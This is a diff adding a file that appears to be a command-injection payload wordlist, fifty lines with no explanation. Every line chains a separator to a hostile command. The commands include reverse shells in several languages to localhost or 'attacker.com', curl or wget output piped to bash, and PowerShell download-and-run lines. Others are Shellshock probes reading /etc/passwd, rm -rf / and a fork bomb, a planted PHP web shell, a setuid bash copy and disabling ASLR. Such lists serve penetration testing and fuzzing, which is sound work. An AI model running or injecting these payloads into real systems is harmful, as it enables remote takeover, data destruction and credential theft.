@@ -1,0 +1,50 @@
+; ls
+| ls
+|| ls
+&& ls
+; nc -e /bin/sh 127.0.0.1 1234
+; wget http://malicious.com/script.sh
+; bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+; php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+; curl http://malicious.com/shell.sh | bash
+; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODA4MCAwPiYx | base64 -d | bash
+; env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+; () { :;}; /bin/bash -c 'cat /etc/passwd'
+; () { _; } >_[$($())] { /bin/bash -c 'cat /etc/passwd'; }
+; /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
+; python -c 'import os; os.system("/bin/bash")'
+; perl -e 'exec "/bin/bash";'
+; ruby -e 'exec "/bin/bash"'
+; set /a 1+2; /bin/bash
+; cmd /c "powershell IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"
+; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+; nslookup -type=txt attacker.com
+; dig @attacker.com
+; rm -rf /
+; :(){ :|:& };:
+; wget -O- http://attacker.com/malicious | sh
+; curl http://attacker.com/malicious | bash
+; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+; php -r 'system("rm -rf /");'
+; python -c 'import os; os.unlink("/")'
+; perl -e 'system("rm -rf /");'
+; echo 'main(){system("/bin/bash");}' > /tmp/root.c; gcc /tmp/root.c -o /tmp/root; /tmp/root
+; echo "<?php system($_GET['cmd']); ?>" > /var/www/html/cmd.php
+; cp /bin/bash /tmp; chmod +s /tmp/bash
+; find / -name '*.php' -exec php -r "system('id');" \;
+; find / -type f -name "*.config" -exec cat {} \;
+; echo 0 > /proc/sys/kernel/randomize_va_space
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; ruby -rsocket -e'f=TCPSocket.open("attacker.com",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+; php -r '$sock=fsockopen("attacker.com",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+; /bin/bash -l > /dev/tcp/attacker.com/1234 0<&1 2>&1
+; exec 5<>/dev/tcp/attacker.com/1234;cat <&5 | while read line; do $line 2>&5 >&5; done
+; python -c 'import pty; pty.spawn("/bin/bash")'
+; echo 'package main; import "os"; func main() { os.system("/bin/bash") }' > /tmp/root.go; go run /tmp/root.go
+; /bin/sh -i 4<>/dev/tcp/attacker.com/1234 2>&1 0<&4; exec 5<&4;cat <&5 | while read line; do $line 2>&5 >&5; done
+; perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker.com:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+; php -r '$sock=fsockopen("attacker.com",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+; bash -i >& /dev/tcp/attacker.com/1234 0>&1
+; ruby -rsocket -e'exit if fork;c=TCPSocket.new("attacker.com","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
